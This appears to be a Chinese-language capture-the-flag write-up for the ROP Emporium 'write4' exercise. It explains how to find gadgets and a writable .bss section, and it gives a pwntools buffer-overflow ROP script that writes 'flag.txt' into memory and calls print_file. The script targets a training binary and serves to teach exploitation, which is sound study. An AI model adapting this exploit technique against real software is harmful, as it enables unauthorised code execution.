---
title: write4
published: 2026-05-20
image: ""
tags: [pwn]
category: pwn
draft: false
series: ROP Emporium
---


# 题目描述

正如题目所言，我们最感兴趣的字符串`"/bin/cat flag.txt"`这次并不存在。为此我们引入了新的方法：**通过找允许我们将值写入内存的 gadget和写入位置，构造rop链，达到在指定地址写入目标字符串并使用的目的**。

# 解题流程

## 工具

`pwntools`，`ropper`

依旧精简

## 查反汇编，确定函数地址，找有用gadget；readelf确定写入地址

不看文件权限了，懂的都懂()

直接看反汇编

```terminal
objdump -d -M intel ./write4
```

找到：

```terminal
0000000000400510 <print_file@plt>

0000000000400628 <usefulGadgets>:
  400628:       4d 89 3e                mov    QWORD PTR [r14],r15
  40062b:       c3                      ret
  40062c:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]
```

usefulGadgets里面的指令翻译过来就是**把r15内容写入到r14地址内容对应的地址**，正是我们实现**在指定地址写入目标字符串并使用的关键所在**

这次多了一步用`readelf`指令在虚拟内存中找到合适的可写段，指令为：

```terminal
readelf -S -W ./write4
```

找到：

```terminal
[23] .data             PROGBITS        0000000000601028 001028 000010 00  WA  0   0  8
  [24] .bss              NOBITS          0000000000601038 001038 000008 00  WA  0   0  1
```

虽然两者都是WA(可写)，但是这里我们选择.bss，这个总结的时候解释

考虑到后面还会调用参数，题目也说了

```
重要！
PLT 中有一个名为“函数”的条目print_file()存在于挑战二进制文件中，只需将要读取的文件名（例如“flag.txt”）作为第一个参数调用它即可
```

那我们只需要找到pop rdi；ret，到时候将字符串写入地址作为第一参数即可

别忘了写入操作也需要在r14、r15中放入数据，所以还需要找到类似pop r14；pop r15；ret的指令。那么

依旧请出我们的ropper：

```terminal
ropper --file ./write4 --search "pop rdi"
ropper --file ./write4 --search "pop r14"
```

here they are

```terminal
0x0000000000400693: pop rdi; ret; 
0x0000000000400690: pop r14; pop r15; ret;
```

准备就绪，开始构造脚本

## 构造exp脚本

长这样：

```python
from pwn import *

p = process('./write4')

p.recv() 

bss_addr = 0x601038        # .bss 段可写地址
gadget_mov = 0x400628         # mov [r14], r15; ret
gadget_pop_r14_r15 = 0x400690 # pop r14; pop r15; ret (请根据实际情况核对该地址)
gadget_pop_rdi = 0x400693     # pop rdi; ret
print_file = 0x400510         # print_file@plt

payload = b'A' * 40
# 1. 把地址和字符串分别弹入 r14 和 r15
payload += p64(gadget_pop_r14_r15) + p64(bss_addr) + b"flag.txt"
# 2. 执行内存写入
payload += p64(gadget_mov)
# 3. 传参给 print_file 并调用
payload += p64(gadget_pop_rdi) + p64(bss_addr) + p64(print_file)

p.sendline(payload)
p.interactive()
```

跑一下：

```python
python3 write4.py

[+] Starting local process './write4': pid 24031
[*] Switching to interactive mode
Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$ 
```

flag出来了

收工

# 总结

write4 这题让我第一次把 ROP 链从**“调用现成函数”扩展到“先通过 gadget 修改内存内容，再把这块内存作为参数传给函数**

我学会了寻找可写段，理解了 mov [r14], r15 这种写入 gadget 的物理作用，也进一步巩固了 `plt入口`、`参数寄存器`和`rop链`连续执行之间的关系

另外附上一些做题过程产生的认识和理解：

1. 内存写入从你给的地址`开始`，不会`自动追加`到末尾
2. 已有内容会被`覆盖`
3. `QWORD PTR`固定写`8`字节
4. 字符串能不能正确结束，取决于后面有没有 `\x00`，我这里`flag.txt`刚好`8`字节(没有`\x00`)，所以后面可能是`\00`，又或者不会影响读到正确字符串
5. 如果`大于`8字节又想连续写入，就要和前面一样，自己放上`后续地址`、`内容`，并又接上一个写入gadget
6. CPU不管`类型`，类型是`后续代码`怎么解释这些字节决定的

**再解释一下为什么选择写在.bss**：

一般来说，.data放的是已初始化全局数据，.bss放的是未初始化全局数据，也正因如此，.bss内数据常为0，所以经常适合放需要 \x00 结尾的字符串

虽然但当时我用.data写入字符串一样成功了，这是否说明其内容就不重要了呢？

**不一定**

光看这道题，我们只需要把 "flag.txt" 写到 .data 某个地址，然后马上把这个地址传给 print_file()，就得到flag了

也就是说，在我们关心的执行路径里，程序还没来得及、或者根本不需要再使用被我们覆盖的那几个原有的 .data 里的数据，所以它不会影响我们拿到结果

而如果程序后面还要长期稳定运行，或者 .data 那里存的是重要全局状态，那就可能出问题,所以不是说它不重要，而是要视具体情况而言
